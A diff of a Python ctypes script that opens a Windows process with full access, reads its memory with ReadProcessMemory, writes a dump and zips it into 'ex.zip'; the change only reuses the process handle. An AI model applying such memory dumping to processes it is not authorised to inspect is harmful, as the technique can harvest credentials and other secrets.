@@ -83,7 +83,7 @@ class MEMORY_BASIC_INFORMATION(ctypes.Structure):
 
 mbi = MEMORY_BASIC_INFORMATION()
 
-ctypes.windll.Kernel32.VirtualQueryEx(ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid), ctypes.c_uint64(hModule.value), ctypes.byref(mbi),ctypes.sizeof(mbi)) 
+ctypes.windll.Kernel32.VirtualQueryEx(handle, ctypes.c_uint64(hModule.value), ctypes.byref(mbi),ctypes.sizeof(mbi)) 
 
 
 
@@ -104,7 +104,7 @@ final=address+blocks*sysinfo.dwPageSize
 
 while (address < final):
 
-    if (ctypes.windll.kernel32.ReadProcessMemory(ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid), ctypes.c_uint64(address), ctypes.byref(buffer), 4096, ctypes.byref(bytesRead))):
+    if (ctypes.windll.kernel32.ReadProcessMemory(handle, ctypes.c_uint64(address), ctypes.byref(buffer), 4096, ctypes.byref(bytesRead))):
         print('[...]Dumping')
         dump_data.write(buffer.raw)
     else:
@@ -119,7 +119,7 @@ print('[+] Dump finished')
 #-----------Writing to file-----------
 
 
-ctypes.windll.kernel32.CloseHandle(ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid))
+ctypes.windll.kernel32.CloseHandle(handle)
 
 # Compress data
 with zipfile.ZipFile('ex.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
